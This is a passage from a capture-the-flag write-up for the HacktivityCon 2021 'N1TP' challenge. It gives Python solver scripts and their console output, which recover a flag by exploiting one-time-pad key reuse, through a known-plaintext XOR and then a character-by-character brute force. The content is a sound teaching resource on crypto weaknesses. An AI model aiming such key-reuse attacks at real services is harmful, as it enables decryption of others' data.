<span class="n">received_data</span> <span class="o">=</span> <span class="n">tcpsocket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="nb">buffer</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span> <span class="c1"># Get encrypted response
</span><span class="n">encrypted_response</span> <span class="o">=</span> <span class="n">received_data</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">82</span><span class="p">]</span> <span class="c1"># Same format as the original flag.
</span><span class="k">print</span> <span class="p">(</span><span class="n">received_data</span><span class="p">)</span>
<span class="k">print</span> <span class="p">(</span><span class="s">'Encrypted Flag:'</span><span class="p">,</span> <span class="n">encrypted_flag</span><span class="p">)</span>
<span class="k">print</span> <span class="p">(</span><span class="s">'Encrypted Response:'</span><span class="p">,</span> <span class="n">encrypted_response</span><span class="p">)</span>

<span class="c1"># Figure out the key by XORing the plaintext input that was sent with the encrypted value received
</span>
<span class="n">plaintext_hex</span> <span class="o">=</span> <span class="n">input_to_encrypt</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf-8"</span><span class="p">).</span><span class="nb">hex</span><span class="p">()</span>
<span class="n">plaintext_hex_value</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">plaintext_hex</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>

<span class="n">encrypted_plaintext_hex</span> <span class="o">=</span> <span class="nb">int</span><span class="p">((</span><span class="n">encrypted_response</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">otp_key_value</span> <span class="o">=</span> <span class="n">plaintext_hex_value</span><span class="o">^</span><span class="n">encrypted_plaintext_hex</span>

<span class="k">print</span> <span class="p">(</span><span class="s">"Key: "</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">otp_key_value</span><span class="p">))</span>

<span class="c1"># Find the flag by XORing the encrypted flag and the key
</span>
<span class="n">encrypted_flag_value</span> <span class="o">=</span> <span class="nb">int</span><span class="p">((</span><span class="n">encrypted_flag</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">plaintext_flag_hex</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">encrypted_flag_value</span><span class="o">^</span><span class="n">otp_key_value</span><span class="p">)</span>

<span class="n">plaintext_flag</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">plaintext_flag_hex</span><span class="p">[</span><span class="mi">2</span><span class="p">:])</span>

<span class="k">print</span> <span class="p">(</span><span class="s">"Flag calculated as:"</span><span class="p">,</span>  <span class="nb">str</span><span class="p">(</span><span class="n">plaintext_flag</span><span class="p">)[</span><span class="mi">2</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
</code></pre></div></div>

<ul>
  <li>Running this quickly returns the flag.</li>
</ul>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~/sec/CTFs/HacktivityCon2021/N1TP]
</span><span class="gp">‚îî‚îÄ$</span><span class="w"> </span>python3 n1tp2.py                                                                                                             
<span class="go">NINA: Hello! I found a flag, look!

Encrypted Flag: cb31255b7a64b6814aae91e9f1fea18620376bd1a56306bbf33d34e369e48c51ec3f274cda28
Data sent: flag{0123456789abcdef0123456789abcdef}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

      cb31255b7a6db5844ff9c0bdf1f0f9d4263039d6f23502bbf33b31ec3db88c53be3d7218de28
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: cb31255b7a64b6814aae91e9f1fea18620376bd1a56306bbf33d34e369e48c51ec3f274cda28
Encrypted Response: cb31255b7a6db5844ff9c0bdf1f0f9d4263039d6f23502bbf33b31ec3db88c53be3d7218de28
Key:  0xad5d443c015d84b67ccdf58bc6c8c0b544535db394053389c00f04da0a80b532dc5e167db855
Flag calculated as: flag{9276cdb76a3dd6b1f523209cd9c0a11b}
</span></code></pre></div></div>

<ul>
  <li>The Python code below accomplishes an alternative, brute force method of solving this challenge.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># H@cktivityCon 2021 - N1TP Solution (Brute Force)
# shinris3n
</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="n">address</span> <span class="o">=</span> <span class="s">'challenge.ctf.games'</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">31921</span>
<span class="nb">buffer</span> <span class="o">=</span> <span class="mi">4096</span>

<span class="c1"># The encrypted flag received from "NINA" after connecting to the service.
</span><span class="n">encrypted_flag</span> <span class="o">=</span> <span class="s">''</span>

<span class="c1"># The rules state: Flags for this competition will follow the format: flag\{[0-9a-f]{32}\}. That means a `flag{}` wrapper with what looks like an MD5 hash inside the curly braces.
</span><span class="n">input_to_encrypt</span> <span class="o">=</span> <span class="s">'flag{'</span> <span class="o">+</span> <span class="s">'0'</span><span class="o">*</span><span class="mi">32</span> <span class="o">+</span> <span class="s">'}'</span>

<span class="n">received_data</span> <span class="o">=</span> <span class="s">''</span>

<span class="n">possible_flag_characters</span> <span class="o">=</span> <span class="s">'0123456789abcdef'</span>

<span class="c1"># Open up connection.
</span><span class="n">tcpsocket</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">tcpsocket</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">address</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>

<span class="c1"># Get greeting.
</span><span class="n">received_data</span> <span class="o">=</span> <span class="n">tcpsocket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="nb">buffer</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
<span class="k">print</span> <span class="p">(</span><span class="n">received_data</span><span class="p">)</span>

<span class="c1"># Retrieve and store the encrypted flag. 
</span><span class="n">received_data</span> <span class="o">=</span> <span class="n">tcpsocket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="nb">buffer</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
<span class="n">encrypted_flag</span> <span class="o">=</span> <span class="n">received_data</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">82</span><span class="p">]</span> <span class="c1"># The flag appears to be hex formatted, 64 characters plus 12 characters for the flag{} portion, and 6 spaces of padding.
</span><span class="k">print</span> <span class="p">(</span><span class="s">'Encrypted Flag:'</span><span class="p">,</span> <span class="n">encrypted_flag</span><span class="p">)</span>

<span class="c1"># Send input to encrypt in flag format.
</span><span class="n">formatted_data_to_send</span> <span class="o">=</span> <span class="p">(</span><span class="n">input_to_encrypt</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
<span class="n">tcpsocket</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">formatted_data_to_send</span><span class="p">)</span>
<span class="k">print</span> <span class="p">(</span><span class="s">'Data sent:'</span><span class="p">,</span> <span class="n">input_to_encrypt</span><span class="p">)</span>

<span class="c1"># Get and store encrypted response.
</span><span class="n">received_data</span> <span class="o">=</span> <span class="n">tcpsocket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="nb">buffer</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span> <span class="c1"># Get flavor text
</span><span class="k">print</span> <span class="p">(</span><span class="n">received_data</span><span class="p">)</span>
<span class="n">received_data</span> <span class="o">=</span> <span class="n">tcpsocket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="nb">buffer</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span> <span class="c1"># Get encrypted response
</span><span class="n">encrypted_response</span> <span class="o">=</span> <span class="n">received_data</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">82</span><span class="p">]</span> <span class="c1"># Same format as the original flag.
</span><span class="k">print</span> <span class="p">(</span><span class="n">received_data</span><span class="p">)</span>
<span class="k">print</span> <span class="p">(</span><span class="s">'Encrypted Flag:'</span><span class="p">,</span> <span class="n">encrypted_flag</span><span class="p">)</span>
<span class="k">print</span> <span class="p">(</span><span class="s">'Encrypted Response:'</span><span class="p">,</span> <span class="n">encrypted_response</span><span class="p">)</span>

<span class="c1"># Now cycle through the possible flag characters, checking values until everything matches.
# Starting with character 6 (array index 5), cycle through possible flag characters and move on only after finding a match.
</span><span class="n">flag_match_index</span> <span class="o">=</span> <span class="mi">5</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        
        <span class="k">for</span> <span class="n">possible_flag_character</span> <span class="ow">in</span> <span class="n">possible_flag_characters</span><span class="p">:</span>
                <span class="n">input_to_encrypt</span> <span class="o">=</span> <span class="n">input_to_encrypt</span><span class="p">[:</span><span class="n">flag_match_index</span><span class="p">]</span> <span class="o">+</span><span class="n">possible_flag_character</span> <span class="o">+</span> <span class="n">input_to_encrypt</span><span class="p">[</span><span class="n">flag_match_index</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:]</span>
                <span class="c1">#time.sleep(2) # Two second delay to avoid overloading service.
</span>                <span class="c1"># Send input to encrypt in flag format.
</span>                <span class="n">formatted_data_to_send</span> <span class="o">=</span> <span class="p">(</span><span class="n">input_to_encrypt</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
                <span class="n">tcpsocket</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">formatted_data_to_send</span><span class="p">)</span>
                <span class="k">print</span> <span class="p">(</span><span class="s">'Data sent:'</span><span class="p">,</span> <span class="n">input_to_encrypt</span><span class="p">)</span>
                <span class="n">received_data</span> <span class="o">=</span> <span class="n">tcpsocket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="nb">buffer</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span> <span class="c1"># Get flavor text
</span>                <span class="k">print</span> <span class="p">(</span><span class="n">received_data</span><span class="p">)</span>
                <span class="n">received_data</span> <span class="o">=</span> <span class="n">tcpsocket</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="nb">buffer</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span> <span class="c1"># Get encrypted response
</span>                <span class="n">encrypted_response</span> <span class="o">=</span> <span class="n">received_data</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">82</span><span class="p">]</span> <span class="c1"># Same format as the original flag.
</span>                <span class="k">print</span> <span class="p">(</span><span class="n">received_data</span><span class="p">)</span>
                <span class="k">print</span> <span class="p">(</span><span class="s">'Encrypted Flag:'</span><span class="p">,</span> <span class="n">encrypted_flag</span><span class="p">)</span>
                <span class="k">print</span> <span class="p">(</span><span class="s">'Encrypted Response:'</span><span class="p">,</span> <span class="n">encrypted_response</span><span class="p">)</span>        
                
                <span class="k">if</span> <span class="n">encrypted_flag</span><span class="p">[</span><span class="n">flag_match_index</span><span class="o">*</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="n">encrypted_response</span><span class="p">[</span><span class="n">flag_match_index</span><span class="o">*</span><span class="mi">2</span><span class="p">]:</span>
                        <span class="k">if</span> <span class="n">encrypted_flag</span><span class="p">[</span><span class="n">flag_match_index</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">encrypted_response</span><span class="p">[</span><span class="n">flag_match_index</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">1</span><span class="p">]:</span>
                                <span class="n">flag_match_index</span> <span class="o">=</span> <span class="n">flag_match_index</span> <span class="o">+</span> <span class="mi">1</span>
                                <span class="k">print</span> <span class="p">(</span><span class="s">'Matched Character:'</span><span class="p">,</span> <span class="n">input_to_encrypt</span><span class="p">[</span><span class="n">flag_match_index</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
                                <span class="k">print</span> <span class="p">(</span><span class="s">'Next Character to Match:'</span><span class="p">,</span> <span class="n">input_to_encrypt</span><span class="p">[</span><span class="n">flag_match_index</span><span class="p">])</span>
                                <span class="k">if</span> <span class="n">input_to_encrypt</span><span class="p">[</span><span class="n">flag_match_index</span><span class="p">]</span> <span class="o">==</span> <span class="s">'}'</span><span class="p">:</span>
                                        <span class="c1"># Close out connection.
</span>                                        <span class="n">tcpsocket</span><span class="p">.</span><span class="n">shutdown</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
                                        <span class="n">tcpsocket</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
                                        <span class="k">print</span> <span class="p">(</span><span class="s">'Flag Found:'</span> <span class="p">,</span><span class="n">input_to_encrypt</span><span class="p">)</span>
                                        <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>Below is a snippet of the corresponding output, along with the flag:</li>
</ul>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">‚îå‚îÄ‚îÄ(shinris3n„âøkodachi)-[~/sec/CTFs/HacktivityCon2021/N1TP]
</span><span class="gp">‚îî‚îÄ$</span><span class="w"> </span>python3 ./n1tp.py 
<span class="go">NINA: Hello! I found a flag, look!

Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Data sent: flag{00000000000000000000000000000000}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

      735097cf4edadd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Encrypted Response: 735097cf4edadd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
Data sent: flag{00000000000000000000000000000000}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

      735097cf4edadd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Encrypted Response: 735097cf4edadd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
Data sent: flag{10000000000000000000000000000000}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

      735097cf4edbdd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Encrypted Response: 735097cf4edbdd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
Data sent: flag{20000000000000000000000000000000}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

      735097cf4ed8dd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Encrypted Response: 735097cf4ed8dd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
Data sent: flag{30000000000000000000000000000000}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

      735097cf4ed9dd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Encrypted Response: 735097cf4ed9dd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
Data sent: flag{40000000000000000000000000000000}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

      735097cf4ededd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Encrypted Response: 735097cf4ededd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
Data sent: flag{50000000000000000000000000000000}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

      735097cf4edfdd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Encrypted Response: 735097cf4edfdd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
Data sent: flag{60000000000000000000000000000000}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

      735097cf4edcdd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Encrypted Response: 735097cf4edcdd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
Data sent: flag{70000000000000000000000000000000}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

      735097cf4edddd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Encrypted Response: 735097cf4edddd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
Data sent: flag{80000000000000000000000000000000}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

      735097cf4ed2dd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Encrypted Response: 735097cf4ed2dd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
Data sent: flag{90000000000000000000000000000000}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

      735097cf4ed3dd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Encrypted Response: 735097cf4ed3dd9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
Matched Character: 9
Next Character to Match: 0
Data sent: flag{9a000000000000000000000000000000}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

      735097cf4ed38c9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Encrypted Response: 735097cf4ed38c9400de7e8f1196220a31c43460b13d7b95450b99513f8b44bc6d526aa8b0ea
Data sent: flag{9b000000000000000000000000000000}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

</span><span class="c">...
...
...
</span><span class="go">
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036bfeb0ea
Data sent: flag{9276cdb76a3dd6b1f523209cd9c0a100}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba8b0ea
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba8b0ea
Data sent: flag{9276cdb76a3dd6b1f523209cd9c0a110}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b0ea
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b0ea
Matched Character: 1
Next Character to Match: 0
Data sent: flag{9276cdb76a3dd6b1f523209cd9c0a112}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b2ea
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b2ea
Data sent: flag{9276cdb76a3dd6b1f523209cd9c0a113}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b3ea
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b3ea
Data sent: flag{9276cdb76a3dd6b1f523209cd9c0a114}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b4ea
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b4ea
Data sent: flag{9276cdb76a3dd6b1f523209cd9c0a115}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b5ea
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b5ea
Data sent: flag{9276cdb76a3dd6b1f523209cd9c0a116}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b6ea
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b6ea
Data sent: flag{9276cdb76a3dd6b1f523209cd9c0a117}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b7ea
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b7ea
Data sent: flag{9276cdb76a3dd6b1f523209cd9c0a118}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b8ea
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b8ea
Data sent: flag{9276cdb76a3dd6b1f523209cd9c0a119}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b9ea
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9b9ea
Data sent: flag{9276cdb76a3dd6b1f523209cd9c0a11a}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e1ea
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e1ea
Data sent: flag{9276cdb76a3dd6b1f523209cd9c0a11b}
NINA: Ta-daaa!! I think this is called a 'one' 'time' 'pad' or something?

      735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
NINA: Isn't that cool!?! Want to see it again? 
      Sorry, I forget already -- what was it you wanted to see again?
</span><span class="gp">&gt;</span><span class="w"> 
</span><span class="go">Encrypted Flag: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Encrypted Response: 735097cf4ed3df93068d2add1690730965903232b06b7e97460999586cdf4def6d036ba9e2ea
Matched Character: b
Next Character to Match: }
Flag Found: flag{9276cdb76a3dd6b1f523209cd9c0a11b}
